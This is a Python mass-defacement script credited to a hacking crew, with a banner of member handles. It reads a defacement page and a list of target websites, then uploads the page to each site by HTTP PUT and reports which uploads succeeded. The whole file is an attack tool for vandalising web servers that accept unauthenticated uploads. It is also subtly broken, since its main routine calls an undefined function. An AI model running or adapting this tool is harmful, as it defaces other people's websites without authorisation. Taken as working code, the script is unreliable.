#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """

Author/Decoder     : MrC3nd0l
Team               : D45H7
Thx to             : L1nUx3R - Mr.Red - MR.B1GSMOK3 - D45H7


~=~=~=~=~=~=~=~=~=~=~=~
OFFICIAL MEMBER D45H7
~=~=~=~=~=~=~=~=~=~=~=~
L1nUx3R - Mr.Red - MrC3nd0l - i1000 - Mr.M3GR0 - 
C¥B3R•CR1M3)Mr_k13 - D45H|∆$¢•closeUp™- MR.KEHELADACK -
Liee•cyber™ - Đ3C|SSCmr.ZΞXfirsthWCF - Bakong Atjeh🦠⁴5 -
🇦🇲#predator07#🇦🇲 - D45H7|L0xS10xS•√ - tnM3T30r -
༒BCA•||MR•A•|D4SH - Mr.DH17 - EvCf1703 - Mr.D45H||Cyber
###########################################################
        ########################################
##########################################################
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(crot):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(crot)
   else:
      ipt = raw_input(crot)
   
   return str(ipt)

def mass(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
